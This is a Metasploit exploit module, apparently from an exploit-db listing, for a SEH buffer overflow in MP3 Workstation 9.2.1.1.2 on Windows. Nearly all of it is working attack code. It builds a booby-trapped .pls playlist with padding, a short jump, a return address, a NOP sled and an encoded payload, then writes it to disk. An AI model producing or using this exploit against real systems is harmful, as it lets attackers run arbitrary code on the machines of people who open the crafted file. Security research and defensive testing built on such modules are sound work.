MP3 Workstation Version 9.2.1.1.2 SEH exploit (MSF)
===================================================

# Exploit ClimatisÃ©e fermee la Porte DeRriÃ¨re Twaa xDeii
# Title: MP3 Workstation  Version 9.2.1.1.2 buffer overflow exploit (MSF)
# Sanjeev Gupta san.gupta86[at]gmail.com (http://www.exploit-db.com/exploits/15013/)
# Author: MadjiX
# Sec4ever.com
# WinXp Fr
 
require &#039;msf/core&#039;
  
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
  
    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Remote::Seh
  
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039; => &#039;MP3 Workstation  Version 9.2.1.1.2 buffer overflow&#039;,
            &#039;License&#039; => MSF_LICENSE,
            &#039;Author&#039; => &#039;MadjiX&#039;,
            &#039;Version&#039; => &#039;Version 1&#039;,
            &#039;References&#039; =>
                [
                    [ &#039;OSVDB&#039;, &#039;&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/15013/&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Payload&#039; =>
                {
                    &#039;Space&#039; => 4488,
                    &#039;BadChars&#039; => "\x00\x20\x0a\x0d",
                    &#039;StackAdjustment&#039; => -3500,
                    &#039;DisableNops&#039; => &#039;True&#039;,
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039; =>
                [
                    [ &#039;Windows Universal&#039;, { &#039;Ret&#039; => 0x733DB159} ],
  
                ],
            &#039;Privileged&#039; => false,
            &#039;DefaultTarget&#039; => 0))
  
        register_options(
            [
                OptString.new(&#039;FILENAME&#039;, [ false, &#039;The file name.&#039;, &#039;mad.pls&#039;]),
            ], self.class)
    end
  
  
    def exploit
  
    sploit = "MP3 Workstation"
        sploit << "\x5B\x70\x6C\x61\x79\x6C\x69\x73\x74\x5D\x0D\x0A\x46\x69\x6C\x65\x31\x3D" #header -Sanjeev
        sploit << rand_text_alphanumeric(1940)
        sploit << "\xeb\x06\x90\x90"            # short jump 6 bytes
        sploit << [target.ret].pack(&#039;V&#039;)
        sploit << "\x90" * 12                    # nop sled
        sploit << payload.encoded
        sploit << "\x90" * 2805
  
        mad = sploit
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
        file_create(mad)
  
    end
  
end



